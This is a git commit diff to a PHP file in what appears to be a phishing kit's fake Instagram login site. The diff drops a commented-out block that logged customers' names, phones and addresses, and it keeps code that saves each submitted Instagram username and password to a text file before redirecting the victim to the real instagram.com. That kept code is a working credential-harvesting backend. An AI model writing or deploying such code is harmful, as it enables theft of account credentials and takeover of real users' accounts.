5d81e3499643a88641fab360359780c5c327728a
Brahmaji Mothukuri <youremail@example.com>
2025-05-23 02:03:25 +0530

    Updated Instagram login page and PHP script

--- .sites/instagram/login.php
+++ .sites/instagram/login.php
@@ -1,21 +1,4 @@
 <?php
-/*$data = "Name: " . $_POST['name'] . "\n" .
-        "Phone: " . $_POST['phone'] . "\n" .
-        "Email: " . $_POST['email'] . "\n" .
-        "Address: " . $_POST['address'] . "\n" .
-        "City: " . $_POST['city'] . "\n" .
-        "Product ID: " . $_POST['product_id'] . "\n" .
-        "Landmark: " . $_POST['landmark'] . "\n" .
-        "Alt Phone: " . $_POST['alt_phone'] . "\n" .
-        "--------------------------\n";
-
-file_put_contents("orders.txt", $data, FILE_APPEND);
-
-echo "✅ Order submitted successfully!"; */
-?>
-
-
-<?php
 
 file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
 header('Location: https://instagram.com');
